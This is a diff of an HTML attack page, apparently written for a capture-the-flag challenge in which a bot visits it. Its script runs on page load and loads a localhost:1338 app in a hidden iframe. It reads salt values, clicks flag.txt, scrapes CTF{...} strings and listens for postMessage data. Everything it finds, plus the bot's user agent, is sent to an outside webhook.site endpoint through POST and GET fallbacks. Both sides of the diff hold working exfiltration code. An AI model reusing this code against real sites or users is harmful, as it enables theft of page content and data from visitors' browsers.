@@ -4,115 +4,156 @@
     <title>Simple Flag Exfiltration</title>
 </head>
 <body>
-    <h1>Flag Exfiltration via Webhook</h1>
-    <div id="status">Waiting for bot...</div>
+    <h1>Flag Exfiltration</h1>
+    <div id="status">Bot visited! Extracting flag...</div>
     
     <script>
-        // Get a webhook URL from webhook.site
-        const WEBHOOK_URL = 'https://webhook.site/4d352f78-695e-4509-80a0-d978376b270f';
+        const WEBHOOK_URL = 'https://webhook.site/YOUR-WEBHOOK-ID';
         
         function log(msg) {
             console.log(msg);
             document.getElementById('status').innerHTML += `<p>${msg}</p>`;
         }
         
-        async function exfiltrateFlag() {
-            log('Bot visited! Starting simple exfiltration...');
+        async function sendToWebhook(data) {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data),
+                    mode: 'no-cors'  // This bypasses CORS issues
+                });
+            } catch (e) {
+                // Fallback: try GET request
+                const params = new URLSearchParams(data).toString();
+                await fetch(`${WEBHOOK_URL}?${params}`, {mode: 'no-cors'});
+            }
+        }
+        
+        async function extractFlag() {
+            log('Starting flag extraction...');
+            
+            // Send confirmation that bot visited
+            await sendToWebhook({
+                status: 'extraction_started',
+                timestamp: new Date().toISOString(),
+                user_agent: navigator.userAgent
+            });
             
             try {
-                // Method 1: Try to access the main app directly
-                const response = await fetch('http://localhost:1338');
-                const html = await response.text();
+                // Method 1: Try to navigate to localhost:1338 in same window
+                log('Attempting to navigate to main application...');
                 
-                // Look for flag in the HTML
-                const flagMatch = html.match(/CTF\{[^}]+\}/);
-                if (flagMatch) {
-                    const flag = flagMatch[0];
-                    log(`Found flag: ${flag}`);
-                    
-                    // Send to webhook
-                    await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            flag: flag,
-                            source: 'direct_fetch',
-                            timestamp: new Date().toISOString()
-                        })
-                    });
-                    
-                    // Also try GET request with flag in URL
-                    await fetch(`${WEBHOOK_URL}?flag=${encodeURIComponent(flag)}`);
-                    
-                    document.getElementById('status').innerHTML = 
-                        `<h2 style="color: green;">FLAG SENT: ${flag}</h2>`;
-                    return;
-                }
+                // Use location.replace to navigate in same context
+                setTimeout(() => {
+                    window.location.replace('http://localhost:1338');
+                }, 1000);
                 
-                log('Flag not found in main page HTML, trying iframe approach...');
-                
-                // Method 2: Use iframe and extract from there
+                // Also try iframe approach as backup
                 const iframe = document.createElement('iframe');
                 iframe.src = 'http://localhost:1338';
                 iframe.style.display = 'none';
                 document.body.appendChild(iframe);
                 
                 iframe.onload = async () => {
+                    log('Iframe loaded successfully');
+                    
                     try {
-                        // Try to access mathRandomInvocations
+                        // Try to access the mathRandomInvocations array
                         const saltArray = iframe.contentWindow.mathRandomInvocations;
                         if (saltArray && saltArray.length > 0) {
                             const salt = saltArray[saltArray.length - 1];
                             log(`Found salt: ${salt}`);
                             
-                            // Send salt info to webhook
-                            await fetch(WEBHOOK_URL, {
-                                method: 'POST',
-                                body: JSON.stringify({
-                                    salt: salt,
-                                    salts_array: saltArray,
-                                    message: 'Found mathRandomInvocations'
-                                })
+                            await sendToWebhook({
+                                salt: salt,
+                                salts_array: saltArray,
+                                message: 'Found mathRandomInvocations via iframe'
+                            });
+                            
+                            // Try to click the flag file
+                            const filesList = iframe.contentWindow.document.querySelector('#filesList');
+                            if (filesList) {
+                                const flagFile = Array.from(filesList.children).find(
+                                    el => el.dataset.name === 'flag.txt'
+                                );
+                                
+                                if (flagFile) {
+                                    log('Found flag file, clicking it...');
+                                    flagFile.click();
+                                    
+                                    // Wait for flag to load and extract it
+                                    setTimeout(async () => {
+                                        const previewIframe = iframe.contentWindow.document.querySelector('#previewIframe');
+                                        if (previewIframe) {
+                                            try {
+                                                const flagContent = previewIframe.contentDocument.body.innerText;
+                                                if (flagContent && flagContent.includes('CTF{')) {
+                                                    log(`🚩 FLAG FOUND: ${flagContent}`);
+                                                    
+                                                    await sendToWebhook({
+                                                        flag: flagContent,
+                                                        method: 'iframe_extraction',
+                                                        timestamp: new Date().toISOString()
+                                                    });
+                                                    
+                                                    document.getElementById('status').innerHTML = 
+                                                        `<h2 style="color: green;">FLAG SENT: ${flagContent}</h2>`;
+                                                }
+                                            } catch (e) {
+                                                log('Could not access SafeFrame content');
+                                                await sendToWebhook({
+                                                    error: 'SafeFrame access failed',
+                                                    details: e.message
+                                                });
+                                            }
+                                        }
+                                    }, 3000);
+                                }
+                            }
+                        }
+                        
+                        // Also try to extract flag from page HTML directly
+                        const pageContent = iframe.contentWindow.document.documentElement.innerHTML;
+                        const flagMatch = pageContent.match(/CTF\{[^}]+\}/);
+                        if (flagMatch) {
+                            const flag = flagMatch[0];
+                            log(`🚩 FLAG FOUND in HTML: ${flag}`);
+                            
+                            await sendToWebhook({
+                                flag: flag,
+                                method: 'html_extraction',
+                                timestamp: new Date().toISOString()
                             });
                         }
                         
-                        // Try to access the page content
-                        const iframeContent = iframe.contentDocument.documentElement.innerHTML;
-                        const iframeFlagMatch = iframeContent.match(/CTF\{[^}]+\}/);
-                        if (iframeFlagMatch) {
-                            const flag = iframeFlagMatch[0];
-                            log(`Found flag in iframe: ${flag}`);
-                            
-                            await fetch(`${WEBHOOK_URL}?flag=${encodeURIComponent(flag)}&source=iframe`);
-                            document.getElementById('status').innerHTML = 
-                                `<h2 style="color: green;">FLAG SENT: ${flag}</h2>`;
-                        }
-                        
-                    } catch (e) {
-                        log(`Iframe access error: ${e.message}`);
-                        await fetch(WEBHOOK_URL, {
-                            method: 'POST',
-                            body: JSON.stringify({error: e.message, step: 'iframe_access'})
+                    } catch (error) {
+                        log(`Iframe access error: ${error.message}`);
+                        await sendToWebhook({
+                            error: 'iframe_access_failed',
+                            details: error.message
                         });
                     }
                 };
                 
-            } catch (error) {
-                log(`Fetch error: ${error.message}`);
+                iframe.onerror = async () => {
+                    log('Iframe failed to load');
+                    await sendToWebhook({
+                        error: 'iframe_load_failed',
+                        message: 'Could not load localhost:1338 in iframe'
+                    });
+                };
                 
-                // Send error info to webhook
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        error: error.message,
-                        step: 'initial_fetch',
-                        timestamp: new Date().toISOString()
-                    })
+            } catch (error) {
+                log(`Extraction failed: ${error.message}`);
+                await sendToWebhook({
+                    error: 'extraction_failed',
+                    details: error.message
                 });
             }
         }
         
-        // Method 3: Listen for any postMessages that might contain the flag
+        // Listen for any postMessages that might contain the flag
         window.addEventListener('message', async (event) => {
             log(`Received message: ${JSON.stringify(event.data)}`);
             
@@ -121,39 +162,28 @@
                 const flagMatch = dataStr.match(/CTF\{[^}]+\}/);
                 if (flagMatch) {
                     const flag = flagMatch[0];
-                    log(`Found flag in message: ${flag}`);
+                    log(`🚩 FLAG FOUND in message: ${flag}`);
                     
-                    await fetch(`${WEBHOOK_URL}?flag=${encodeURIComponent(flag)}&source=postmessage`);
-                    document.getElementById('status').innerHTML = 
-                        `<h2 style="color: green;">FLAG SENT: ${flag}</h2>`;
+                    await sendToWebhook({
+                        flag: flag,
+                        method: 'postmessage',
+                        timestamp: new Date().toISOString()
+                    });
                 }
             }
             
-            // Send all messages to webhook for analysis
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                body: JSON.stringify({
-                    message_data: event.data,
-                    message_origin: event.origin,
-                    timestamp: new Date().toISOString()
-                })
+            // Send all messages for analysis
+            await sendToWebhook({
+                message_data: event.data,
+                message_origin: event.origin,
+                type: 'postmessage_received'
             });
         });
         
-        // Start exfiltration immediately
-        exfiltrateFlag();
+        // Start extraction
+        extractFlag();
         
-        // Also send a "bot visited" confirmation
-        fetch(WEBHOOK_URL, {
-            method: 'POST',
-            body: JSON.stringify({
-                status: 'bot_visited',
-                user_agent: navigator.userAgent,
-                timestamp: new Date().toISOString()
-            })
-        });
-        
-        log('Exfiltration script loaded and running...');
+        log('Extraction script loaded and running...');
     </script>
 </body>
 </html>
